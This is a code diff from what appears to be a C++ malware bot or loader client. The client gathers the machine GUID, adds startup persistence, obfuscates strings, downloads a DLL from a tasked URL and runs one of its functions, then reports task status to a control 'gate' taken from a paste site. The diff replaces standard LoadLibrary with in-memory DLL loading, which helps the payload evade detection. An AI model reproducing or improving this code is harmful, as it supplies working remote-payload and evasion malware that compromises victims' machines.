@@ -78,7 +78,8 @@ public:
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost(config);
-
+		CLoad lib;
+		HANDLE hLibrary = 0;
 		if (config.startup == OBFUSCATE("true")) {
 			try {
 				startupPersistence = std::thread(Helpers::addstartup);
@@ -123,20 +124,10 @@ public:
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".dll"));
 					Helpers::downloadFile(url, file);
 					std::string started = OBFUSCATE("failed");
-
-					
-					HINSTANCE hGetProcIDDLL = LoadLibrary(file.c_str());
-					if (hGetProcIDDLL) {
-						//started = "loaded";
-						if (v[3] != "") {
-							func fn = (func)GetProcAddress(hGetProcIDDLL, (LPCSTR)v[3].c_str());
-							//runningPlugin = std::thread(fn, v[4]);
-							fn(v[4]);
-							FreeLibrary(hGetProcIDDLL);
-						}
-						started = "success";
-					}
-					
+					hLibrary = lib.LoadFromFile(file.c_str()); // loaded the dll from byte array.
+					func fn = (func)lib.GetProcAddressFromMemory(hLibrary, (LPCSTR)v[3].c_str());
+					fn(v[4]);
+					lib.FreeLibraryFromMemory(hLibrary);		
 					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
 				}
 				else {
